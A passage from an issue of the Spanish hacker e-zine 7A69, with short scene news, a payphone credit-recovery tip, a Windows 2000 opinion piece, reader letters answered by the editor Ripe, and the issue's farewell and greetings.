con una entrevista al hacker espa¤ol mas conocido, GriYo (ver seccion
entrevista del numero anterior), que no quiso mostrar su identidad en la
primera entrevista que concedia a una television. MindTwist nos explico como
ser un "friker" (entre comillas, ehehe). Subes al tejado y..... bueno mirad
el reportaje si es que no lo habeis echo aun (corre por ahi un fichero de
16Mb con el).

Hay que reconocerle a Television Espa¤ola el valor por realizar un amplio
reportaje de la zona oscura de la red, pero personalmente creo que falto la
presencia de otra gente importante en el mundo Undergr0und, como SET, Rare,
etc. Para el proximo sera.

         <Ripe: Semanas mas tarde, en informe semanal se amplio
                un poco el reportaje. Mas de los mismo>


----------------{ El cambio en las cabinas de telefonica }-------------------

Bueno, ahi va una cosa curiosa que me mando XXX :)

No es cierto que despues de mantener una conversacion, pagada con una moneda
de cien o quinientas pesetas, el usuario deba resignarse a colgar perdiendo
el dinero no utilizado. Esto es lo habitual y gracias a ello Telefonic
ingresa anualmente miles de millones de pesetas. Pese a las confusas
indicaciones de la compañia lo cierto es que puede recuperarse la moneda
inicial mediante los siguientes pasos, en un ejemplo para el que 
utilizaremos una moneda de cien pesetas.

1.- Introduzca la moneda de cien pesetas.

2.- Compruebe, tras terminar la conversacion, la cantida de dinero que 
    todavia puede utilizar. En nuestro ejemplo hemos consumido 30 pesetas y
    queda en el visor una cantida disponible de 70 pesetas.
    
3.- Introduzca treinta pesetas, que es la cantidad cobrada por su
    conversacion.
    
4.- El aparato devolvera las cien pesetas.    

         <Ripe: Yo incluiria un quinto paso, "Pilla la moneda,
	        si no el siguiente que pase se la va a quedar">
		
Todas las cabinas de Telefonica Telecomunicaciones Publicas incluyen una
larga serie de instrucciones entre las que esta el siguiente texto:

"Este telefono tiene cobro ajustado percibiendo el minimo importe posible
para su llamada de entre las monedas utilizadas, con redondeo a fracciones
de cinco pesetas y, al colgar, devuelve las monedas no utilizadas, pero no 
devuelve cambio"

El texto correcto, de acuerdo con lo revelado por ARTICULO 20, seria:

"Este telefono permite recuperar, en metalico, el saldo sobrante que aparece
en el visor despues de una o varias llamadas. Para ello introduzca monedas
por importe de lo consumido, sin colgar el telefono, hasta completar el
credito inicial. Al colgar, el telefono le devolvera el saldo en su
totalidad"

          <Ripe: ¨Quien no se habia dado cuenta que los de
	         la jodida telefonica son unos timadores?


------------------{ Windows 2000, the new generation }-----------------------
-----------------------------------------------------------------------------

Finalmente Microsoft saca a la luz la nueva version de su sistema operativo,
realmente Windows 2000 es lo mejor que ha sacado Microsoft en mucho tiempo.
Se ha hablado mucho por ahi, pero hay que reconocer que Windows 2000 ha
ganado en estavilidad, rapidez, y servicios, mejorando mucho a Windows NT (y
ya no decimos Windows 98 :P). No he tenido la oportunidad de usar mucho este
sistema operativo, pero, en lo poco que lo he usado.... ni un solo cuelgue
(cosa muy rara en los productos de la compa¤ia de Gates).

Microsoft asegura que Windows 2000 es unicamente para las empresas (a ello se
debe su elevadisimo coste) y que el usuario normal deberia seguir con la
version anterio (Windows 98), sin embargo, a mi parecer, todo usuario que
quiera ganar en seguridad, rapidez, estavilidad debe migrar a Windows 2000.

En mi opinion este nuevo sistema operativo de Microsoft ofrece unas
prestaciones similares a las de Linux, con la diferencia que Linux evoluciona
dia a dia, y Windows cada 6 meses. De todos modos, Windows 2000 se presenta
como una muy buena alternativa al Linux.

NOTA: No me he informado mucho del tema de los 63.000 fallos, pero dudo mucho
      que ello sea del todo cierto, aun asi tratare de informarme :)

           <Ripe: Ya tengo la informacion, y he de decir que 
                  muchos de los fallos son menores. De todos
                  modos, espero que Win2000 SP 1 sea 100%
                  seguro>


------------{ Contra la "delincuencia" informatica }-------------------------
-----------------------------------------------------------------------------

En este ultimo mes se han presentado dos iniciativas importantes para tratar
de contrarestar la delincuencia informatica;

Por una parte la BSA asegura recompensas de hasta 500.000 pts a todo aquel
que proporcione pistas o que puedan ayudar a la misma a capturar redes de
pirateria informatica, de esta manera tratan de evitar la compra-venta de CD
piratas que a lo largo de un a¤o eleva las perdidas de las multinacionales
informaticas hasta miles de millones.

Por otro lado la UE inicia un proyecto de formacion de "Policias
Informaticos", por lo que se incian unos cursos en universitarios a los que
asistiran algunos policias para aprender como actuan los llamados.... hackers
(¨Lo que?).

NOTA: Si en una a¤o aprenden que es un sniffer ya estaran contentos, hehehe.


------------------------{ Detenido por chantaje }----------------------------
-----------------------------------------------------------------------------

En francia ha sido detenido un joven de 36 a¤os por chantajear a un banco. El
joven habia diseañdo una targete credito mediante la que podia sacar la 
cantidad de dinero que le pasara por los webos de los cajeros. Lo curioso del
caso es que no tenia intencion de utilizarla, sino que, pedia dinero al banco
para mostrarles su debilidad. (No podia ser menos, los chorizos del banco 
decidieron denunciarle, y lo peor.... se salieron con la suya).






ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º13.- La voz del lector        º      Mailing       º                       º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Editor ]

Bueno, ahi va vuestra seccion.... (Hemos recibido poquisimos mails para este
numero, a ver si para el proximo os animais a escribir y recibimo un millon
de mails :P)

-{ 01 }----------------------------------------------------------------------

Hola ripe, te escribo para decirte que tu ezine es cojonu**, que el
mejor proveedor es uni2, que la vida es bella, que me han quedado
tropecientas asignaturas pendientes, y que tengo una sugerencia para
este ezine, el cualincluyo en mi top10 de ezines de calidad ;-), que
hagais un curso de scripting, es algo interesante que no se puede
encontrar en demasiados ezines, (en alguno si?) y que seguro a la
gente le entusiasmaria, y nada mas, para que luego vayas diciendo que
no te escribimos ;-)). Bies a to2 de Tahum!

         <Ripe: Por desgracia es cierto que no escribiis ;(>

    <Ripe: Gracias por el mail y por incluirnos en el top10 de
           ezines, de todos modos estaria bien que cambiaras ese
           "su" por un "vuestro" :P
           En lo referente al curso de scripting, se tiene pensado
           escribirlo en un futuro muy cercano, eperamos que sea de
           tu agrado ;) >

-----------------------------------------------------------------------------


-{ 02 }----------------------------------------------------------------------

Nas Ripe. Soy Attanar, un 
chico que entró el otro día en el chat de #hacker 
preguntando de donde sacar informacion para legar a ser 
hacker y me mandaron a tus ezines. Lo cierto es que son 
una maravilla.

	       <Ripe: Amz, jeje>

Te escribía para decirte que 
aunque la revista está muy bien hecha pues hay algunas 
cosas que no entiendo. Ej: te pones a hablar de el TCP/
IP y empiezas a hablar de 7 partes, y es que yo soy 
incapaz de visualizar esas 7 partes ¿donde están?¿partes 
de que? (a lo mejor piensas que soy tonto, pero es que 
no me entra ne la cabeza)

	<Ripe: Esto del |CoDeX| que lo escribio,
               de todos modos mirate el articulo
	       "Entrañas de internte; protocolos
               y demas" de este mismo numero :P>

Otra cosa que te quería 
comentar es un problemilla que tengo. Verás, yo uso un 
Mac, (que dirán lo que quieran, pero para mi es sagrado) 
y da la casualdad de que la tienda en que lo adquirí 
vende uniocamente Mac's SCSI. Como comprenderás a mi eso 
de SCSI o lo que sea me la resbalaba cuando lo adquirí 
(para mi era un Mac como otro cualquiera), pero cuando 
en una de las revistas que suelo comprar de Macintosh 
(MacWorld) ví que incluían el MkLinux (es parecido al 
sistema UNIX ¿no?) me entraron ganas de instalarmelo 
para conocerlo y poder llegar a hackear. Bueno, pues la 
cosa es que no funciona en SCSI y me temo que no voy a 
poder instalármelo. Ahora resulta que empiezo a saber 
algo y como sólo conozco un hacker que use Mac (ICEFIRE, 
que ha desaparecido)y ya nunca le veo pues no tengo 
ninguna utilidad de hackear.Lo siento si te he dado el 
coñazo, pero es que necesito una solución.

	<Ripe: No cabe duda que la iniciativa
	       MKLinux es muy buena. No sabia
               que habia problemas con el 
               sistema SCSI, bueno, de todos
               modos creo que no tardaran en
               solucionarlo>

También te quería decir que 
estoy acabando de hacer mi página web (http://
members.es.tripod.de/Attanar y que me gustaría incluir 
tus revistas en ella, aunque no tenga mucha relación con 
ese tema)

	   <Ripe: No proble. Tu mete mete>

Nada más, solo darte las 
gracias por tu atención, pedirte que me respondas (a ser 
posible contestando mis dudas) y hacerte entrega de unas 
de esas frases que tanto reclamas, no se si tienen 
alguna relación con lo que tú quieres, pero son poéticas 
XD.

Nos las da el profesor de 
"transición a la vida adulta y activa"

• "No tengas miedo a ir 
despacio, tan solo tenlo de quedarte parado" - proverbio 
chino

• "Sólo las personas que han 
recibido esucación son verdaderamente libres" - Epícteto

• "Casi todo lo grande ha sido 
llevado a cabo por la juventud" - Disraelí (un tío 
listo)

• "La vida es como un arca 
inmensa llena de posibilidades" - Amando Nervo

• "Los mejores artistas son 
los que hacen una obra de arte con su propia vida"


- G. Mateu

• "Fórmate tú en vez de 
esperar a que te formen y te modelen" - H. Spencer

• "Un matemático que no es 
también un poco poeta no será jamás un matemático 
completo" <---- Atención a esta, parece tonta pero tiene 
mucho mensaje - W- Weirs

	<Ripe: Hehehehe, gracias por las frase>	

PD: ¿que edad tienes? Yo soy 
bastante joven y, por algunas de las cosas que dices me 
parece que somos de la edad.

             <Ripe: Soy joven :P, baste eso>

-----------------------------------------------------------------------------

-{ 03 }----------------------------------------------------------------------

Ha llegado el momento en k chutas una piedra y
salen 60 grupos y 35 ezines de su interior. Pero
de los ezines que hay he de decir que pocos se
salvan (SET, Rare, JJF), y creo que 7a69 esta
entre esos pocos. Habeis sacado ta 6 numeros,
y aun que el nivel es bajo parece que va
subiendo progresivamente.

Nada mas solo eso. Seguid asi.

        <Ripe: Gracias por los animos :P>

        <Ripe: Ah! hemos sacado 7 numeros no
               6>

-----------------------------------------------------------------------------

Fin de vuestra seccion.... (lo mismo de antes)







ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º         * ARTICULO *         º      * TEMA *      º       * NIVEL *       º
ºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄºÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄº
º14.- Despedida                º   Un numero mas    º                       º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
                                                                   [ Editor ]

Bueno, hemos cumplido un a¤o (BIEEEEEEEEEEEEEEEEE), que decir..... Esperamos
seguir mejorando y subiendo el nivel (Como hemos echo hasta ahora), y ganando
lectores (esto es importante, ehehe), por lo que si tienes algun articulo
intresante no dudes en mandarlo a..... ya sabeis el mail ¿no?

Este numero se ha retrasado un poquitin (Hehehe, nos vamos pareciendo a quien
yo me se), pero trataremos que {7A69} #9 salga dentro de 1 mes y medio (¡eh!
que conste que no aseguramos nada :P).

Bueno, nada mas, nos vemos dentro de..... 1 mes y medio, ehehe.

¡¡Ostia!! Que se me olvidan los saludos....

       *A -J.J.F. /Hacker Team-, gracias por concedernos la entrevista :P

       *A MindTwist, gracias por.... ejem ejem xD
       
       *A S.E.T., gracia por eso (¨lo que?)
       
       *A #networking, por esas charlas nocturnas :)

       *Al [LSD]-MT, por el ventilador que me regalaste, jejeje.

       *A..... ti por leernos, iep iep.
       
       *A, B, C, D.... (El chiste es muy malo, ya lo se)
       

Byez....       




#############################################################################
# NOTA: 7A69 es un E-Zine abierto, por lo que cualquira que quiera          #
#       colaborar con algun articulo solo tiene que mandarlo a:             #
#                                                                           #
#                          7a69ezine@mixmail.com                            #
#                                                                           #
#       Se eperan especialmente articulos relacionados con el crack y       #
#       la telefonia, juer, a ver si se anima alguien que estamos           #
#       necesitadillos ;)                                                   #
#############################################################################

-----------------------------------------------------------------------------
                   Eso... eso... eso es todo.... amigos
-----------------------------------------------------------------------------

